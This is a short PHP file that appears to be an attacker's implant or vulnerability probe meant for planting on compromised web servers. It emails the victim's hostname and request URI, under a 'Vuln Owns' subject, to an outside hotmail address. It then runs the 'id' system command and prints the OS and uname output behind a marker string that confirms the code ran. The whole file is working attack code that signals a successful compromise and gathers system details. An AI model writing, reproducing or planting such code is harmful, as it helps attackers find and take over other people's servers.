<? ob_clean(); ?>
 <?
 $cabeceras = "Content-type: text/html\r\n";
 $m1=$_SERVER['HTTP_HOST'];
 $m2=$_SERVER['REQUEST_URI'];
 $hostn=$_SERVER['HTTP_HOST'];
 $ran = rand(0,999);
 $ran = "$ran$ran";
 $asunto = "$ran # Vuln Owns";
 $arr =array($to,$message);
 $msg = "1nb0x1nh4: $m1.$m2 \nHostname: $hostn\n" . " " . '
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">

</head>


<body>

';
 mail("lorojose6000@hotmail.com", $asunto, $msg, $cabeceras);
 ?>

<?php
$id1 = system(id);
$un = @php_uname();
$os = @PHP_OS;

echo "b1tchxEmailOK<br>";
echo "id: $id1<br>";
echo "os: $os<br>";
echo "uname -a: $un<br>";
exit;

